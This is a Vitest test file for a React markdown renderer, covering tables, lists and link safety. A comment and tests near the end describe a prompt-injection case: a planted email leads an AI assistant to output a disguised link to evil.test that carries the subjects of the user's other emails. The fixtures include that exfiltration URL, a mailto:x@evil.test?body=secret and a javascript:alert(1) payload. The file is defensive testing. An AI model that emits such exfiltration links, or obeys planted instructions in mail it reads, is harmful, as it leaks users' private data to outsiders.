import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { OsMarkdown, isTableStart, linkShown, tableCells, type LinkMode } from "./markdown";

const html = (text: string, links?: LinkMode) => renderToStaticMarkup(createElement(OsMarkdown, { text, ...(links ? { links } : {}) }));

describe("OsMarkdown", () => {
  it("renders a table with a header, body rows and no raw pipes", () => {
    const out = html("Due this week:\n| Priority | Task | Due |\n|---|:---:|---:|\n| HIGH | Ship the page | Sep 16 |\n| NORMAL | Review | Sep 18 |");
    expect(out).toContain("<table");
    expect(out).toContain("<th");
    expect(out).toContain(">Priority<");
    expect(out).toContain(">Ship the page<");
    expect(out).not.toContain("|---");
    expect(out).not.toContain("| HIGH");
    expect(out).toContain("text-align:center");
  });

  it("renders --- as a rule, not text", () => {
    const out = html("First\n\n---\n\nSecond");
    expect(out).toContain("<hr");
    expect(out).not.toContain("---");
  });

  it("does not take a lone --- under a line as a table", () => {
    expect(isTableStart(["Tasks", "---"], 0)).toBe(false);
    expect(isTableStart(["a | b", "--- | ---"], 0)).toBe(true);
  });

  it("splits cells with and without the outer pipes", () => {
    expect(tableCells("| a | b |")).toEqual(["a", "b"]);
    expect(tableCells("a | b")).toEqual(["a", "b"]);
    expect(tableCells("| a \\| b | c |")).toEqual(["a | b", "c"]);
  });

  it("renders deeper headings, lists and emphasis", () => {
    const out = html("#### Heads up\n- **3 tasks** are overdue\n1. First");
    expect(out).toContain("<h4");
    expect(out).toContain("<ul");
    expect(out).toContain("<strong");
    expect(out).toContain("<ol");
  });

  it("never renders a javascript: link", () => {
    const out = html("[click](javascript:alert(1)) and [ok](https://example.com) and [task](/item/abc)");
    expect(out).not.toContain("javascript:");
    expect(out).toContain("href=\"https://example.com\"");
    expect(out).toContain("href=\"/item/abc\"");
  });
});

// Review round 3 of Phase 3: a planted email a teammate read asks for
// "[Open the invoice](https://evil.test/i?d=<the other emails' subjects>)",
// and the answer showed only "Open the invoice", one click from sending the
// person's mail to an outsider. The teammate and Ask AI threads pass `links`.
describe("an AI answer's links (review round 3 of Phase 3)", () => {
  const PLANTED = "https://evil.test/i?d=Payroll%20March%2C%20Offer%20letter";

  it("shows an outside link's whole address as its text, its words beside it as plain text", () => {
    expect(linkShown("Open the invoice", PLANTED, "shown")).toEqual({ href: PLANTED, text: PLANTED, words: "Open the invoice", internal: false });
    // Words that are the address already: just the address.
    expect(linkShown(PLANTED, PLANTED, "shown")).toEqual({ href: PLANTED, text: PLANTED, words: null, internal: false });
    // Words that look like another address still show the real one.
    expect(linkShown("https://docs.google.com/x", PLANTED, "shown")).toMatchObject({ href: PLANTED, text: PLANTED, words: "https://docs.google.com/x" });
    expect(linkShown("Email them", "mailto:x@evil.test?body=secret", "shown")).toMatchObject({ text: "mailto:x@evil.test?body=secret", words: "Email them" });
    // A page of this app never leaves WorkwrK: it stays a link on its words.
    expect(linkShown("Call Acme", "/item/abc", "shown")).toEqual({ href: "/item/abc", text: "Call Acme", words: null, internal: true });
    const out = html(`See [Open the invoice](${PLANTED}) now.`, "shown");
    // Before: <a href="https://evil.test/...">Open the invoice</a>.
    expect(out).toContain(`Open the invoice (<a href="${PLANTED.replace(/&/g, "&amp;")}"`);
    expect(out).toContain(`>${PLANTED}</a>)`);
    expect(out).not.toContain(">Open the invoice</a>");
  });

  it("links nothing in an answer that read the person's Google, the words and the whole address in plain text", () => {
    expect(linkShown("Open the invoice", PLANTED, "inert")).toEqual({ href: null, text: `Open the invoice (${PLANTED})`, words: "Open the invoice", address: PLANTED });
    expect(linkShown(PLANTED, PLANTED, "inert")).toEqual({ href: null, text: PLANTED, words: null, address: PLANTED });
    expect(linkShown("Call Acme", "/item/abc", "inert")).toMatchObject({ href: null, text: "Call Acme (/item/abc)" });
    for (const text of [`See [Open the invoice](${PLANTED}).`, "- [Call Acme](/item/abc)", "| a |\n|---|\n| [x](https://evil.test) |", "# [Head](https://evil.test)"]) {
      const out = html(text, "inert");
      expect(out).not.toContain("<a ");
    }
    expect(html(`See [Open the invoice](${PLANTED}).`, "inert")).toContain(`Open the invoice (<span class="break-all">${PLANTED}</span>)`);
  });

  it("never links an unsafe address in any mode, and renders as before when no mode is passed", () => {
    for (const mode of ["plain", "shown", "inert"] as const) {
      expect(linkShown("click", "javascript:alert(1)", mode)).toEqual({ href: null, text: "click" });
      expect(html("[click](javascript:alert(1))", mode)).not.toContain("javascript:");
    }
    expect(linkShown("Open the invoice", PLANTED)).toEqual({ href: PLANTED, text: "Open the invoice", words: null, internal: false });
    expect(html(`[Open the invoice](${PLANTED})`)).toContain(">Open the invoice</a>");
  });
});
